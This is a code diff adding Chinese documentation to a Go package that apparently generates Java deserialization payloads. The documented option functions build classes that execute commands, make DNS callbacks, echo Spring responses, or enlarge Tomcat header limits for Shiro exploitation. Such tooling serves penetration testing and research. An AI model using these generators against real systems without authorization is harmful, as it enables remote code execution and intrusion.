@@ -620,11 +620,11 @@ func GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*
 }
 
 // SetExecCommand
-// command 请求参数选项函数，用于设置要执行的命令。需要配合SetClassRuntimeExecTemplate使用。
+// command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。
 //
 // Example:
 //
-// yso.GetCommonsBeanutils1JavaObject(yso.SetExecCommand("whoami"),yso.useRuntimeExecTemplate())
+// yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
 func SetExecCommand(cmd string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.Command = cmd
@@ -644,14 +644,13 @@ func SetMajorVersion(v uint16) GenClassOptionFun {
 	}
 }
 
-
 // SetClassRuntimeExecTemplate
 //
-// useRuntimeExecTemplate 请求参数选项函数，用于设置生成RuntimeExec类的模板，需要配合SetExecCommand使用。
+// useRuntimeExecTemplate 请求参数选项函数，用于设置生成RuntimeExec类的模板，需要配合 command 使用。
 //
 // Example:
 //
-// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.SetExecCommand("whoami")
+// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command("whoami"))
 func SetClassRuntimeExecTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = RuntimeExecClass
@@ -695,53 +694,136 @@ func GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun
 	return config.GenerateClassObject()
 }
 
-// ProcessBuilderExec 参数
+// SetClassProcessBuilderExecTemplate
+// useProcessBuilderExecTemplate 请求参数选项函数，用于设置生成ProcessBuilderExec类的模板，需要配合 command 使用。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
 func SetClassProcessBuilderExecTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = ProcessBuilderExecClass
 	}
 }
+
+// SetProcessBuilderExecEvilClass
+// useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。
+//
+// cmd：要执行的命令字符串。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
 func SetProcessBuilderExecEvilClass(cmd string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = ProcessBuilderExecClass
 		config.Command = cmd
 	}
 }
+
+// GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，
+// 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecTemplate和SetExecCommand函数，
+// 以生成在反序列化时会执行特定命令的Java对象。
+//
+// cmd：要在生成的Java对象中执行的命令字符串。
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// command := "ls" // 假设的命令字符串
+//
+// classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessBuilderExec Java对象
 func GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	ops := []GenClassOptionFun{SetClassProcessBuilderExecTemplate(), SetExecCommand(cmd)}
 	config := NewClassConfig(append(options, ops...)...)
 	return config.GenerateClassObject()
 }
 
-// ProcessImplExec 参数
+// SetClassProcessImplExecTemplate
+// useProcessImplExecTemplate 请求参数选项函数，用于设置生成ProcessImplExec类的模板，需要配合command使用。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
 func SetClassProcessImplExecTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = ProcessImplExecClass
 	}
 }
+
+// SetProcessImplExecEvilClass
+// useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。
+//
+// cmd：要执行的命令字符串。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
 func SetProcessImplExecEvilClass(cmd string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = ProcessImplExecClass
 		config.Command = cmd
 	}
 }
+
+// GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，
+// 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和SetExecCommand函数，
+// 以生成在反序列化时会执行特定命令的Java对象。
+//
+// cmd：要在生成的Java对象中执行的命令字符串。
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// command := "ls" // 假设的命令字符串
+//
+// classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessImplExec Java对象
 func GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	ops := []GenClassOptionFun{SetClassProcessImplExecTemplate(), SetExecCommand(cmd)}
 	config := NewClassConfig(append(options, ops...)...)
 	return config.GenerateClassObject()
 }
 
-// dnslog参数
+// SetClassDnslogTemplate
+// useDnslogTemplate 请求参数选项函数，用于设置生成Dnslog类的模板，需要配合 dnslogDomain 使用。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
 func SetClassDnslogTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = DNSlogClass
 	}
 }
+
+// SetDnslog
+// dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。
+//
+// addr：要设置的 Dnslog 域名。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
 func SetDnslog(addr string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.Domain = addr
 	}
 }
+
+// SetDnslogEvilClass
+// useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。
+//
+// addr：要设置的 Dnslog 域名。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
 func SetDnslogEvilClass(addr string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = DNSlogClass
@@ -749,20 +831,50 @@ func SetDnslogEvilClass(addr string) GenClassOptionFun {
 	}
 }
 
-// dnslog生成
+// GenDnslogClassObject
+// GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，
+// 并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnslogDomain 函数，
+// 以生成在反序列化时会向指定的 Dnslog 域名发送请求的Java对象。
+//
+// domain：要在生成的Java对象中请求的 Dnslog 域名。
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// domain := "dnslog.com" // 假设的 Dnslog 域名
+//
+// classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // 生成并配置Dnslog Java对象
 func GenDnslogClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	ops := []GenClassOptionFun{SetClassDnslogTemplate(), SetDnslog(domain)}
 	config := NewClassConfig(append(options, ops...)...)
 	return config.GenerateClassObject()
 }
 
-// spring参数
+// SetClassSpringEchoTemplate
+// useSpringEchoTemplate 请求参数选项函数，用于设置生成SpringEcho类的模板，需要配合 springHeader 或 springParam 使用。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
 func SetClassSpringEchoTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = SpringEchoClass
 	}
 }
 
+// SetHeader
+// springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。
+//
+// key：要设置的 header 键。
+//
+// val：要设置的 header 值。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
 func SetHeader(key string, val string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.HeaderKey = key
@@ -771,40 +883,89 @@ func SetHeader(key string, val string) GenClassOptionFun {
 		config.HeaderValAu = "zh-CN,zh;q=1.9"
 	}
 }
+
+// SetParam
+// springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。
+//
+// param：要设置的请求参数。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
 func SetParam(val string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.Param = val
 	}
 }
+
+// SetExecAction
+// springRuntimeExecAction 请求参数选项函数，设置是否要执行命令。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
 func SetExecAction() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.IsExecAction = true
 	}
 }
+
+// SetEchoBody
+// springEchoBody 请求参数选项函数，设置是否要在body中回显。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
 func SetEchoBody() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.IsEchoBody = true
 	}
 }
 
-// spring生成
+// GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，
+// 这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象
 func GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(append(options, SetClassSpringEchoTemplate())...)
 	return config.GenerateClassObject()
 }
 
-// ModifyTomcatMaxHeaderSize
+// SetClassModifyTomcatMaxHeaderSizeTemplate
+// useModifyTomcatMaxHeaderSizeTemplate 请求参数选项函数，用于设置生成ModifyTomcatMaxHeaderSize类的模板。
+// 一般用于shiro利用，用于修改 tomcat 的 MaxHeaderSize 值。
+//
+// Example:
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
 func SetClassModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = ModifyTomcatMaxHeaderSizeClass
 	}
 }
 
+// GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，
+// 这个函数结合使用 useModifyTomcatMaxHeaderSizeTemplate 函数， 以生成在反序列化时会修改 tomcat 的 MaxHeaderSize 值的Java对象。
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // 生成并配置ModifyTomcatMaxHeaderSize Java对象
 func GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(append(options, SetClassModifyTomcatMaxHeaderSizeTemplate())...)
 	return config.GenerateClassObject()
 }
 
+// GenEmptyClassInTemplateClassObject 生成一个使用EmptyClassInTemplate类模板的javaclassparser.ClassObject对象，
 // 空类生成（用于template）
 func GenEmptyClassInTemplateClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(options...)
